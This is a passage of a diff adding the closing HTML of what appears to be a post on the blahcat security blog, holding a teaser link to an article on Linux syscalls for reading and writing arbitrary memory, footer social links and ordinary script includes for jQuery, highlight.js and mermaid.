+                        </section>
+                    </a>
+                    <a class="post-nav-prev" href="https://blahcat.github.io/posts/2013/12/23/using-new-syscalls-for-readwrite-arbitrary-memory-on-linux.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-right"></i>
+                                <h2 class="post-nav-title">Using new syscalls for read/write arbitrary memory on Linux.</h2>
+                            <p class="post-nav-excerpt">Even though well known methods exist to bypass ptrace deactivation on a process when...</p>
+                        </section>
+                    </a>
+                    <div class="clear"></div>
+                </aside>
+
+            </div>
+        </article>
+    </main>
+      <!-- TODO : Body class -->
+    <div id="body-class" style="display: none;" class=""></div>
+
+    <footer id="footer">
+      <div class="inner">
+        <section class="credits">
+          <span class="credits-theme"><a class="fa fa-twitter fa-3x" href="https://twitter.com/ctf_blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-github fa-3x" href="https://github.com/blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-youtube fa-3x" href="https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg" target="_blank"></a></span>
+          <span class="credits-software">Powered by <a href="https://github.com/getpelican/pelican" rel="nofollow">Pelican</a> and <a href="https://github.com/arulrajnet/attila" rel="nofollow">Attila</a> theme</span>
+        </section>
+      </div>
+    </footer>
+  </section>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script type="text/javascript" src="https://blahcat.github.io/theme/js/script.js"></script>
+
+    <!-- Script specified by the user -->
+    <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js"></script>
+</body>
+</html>
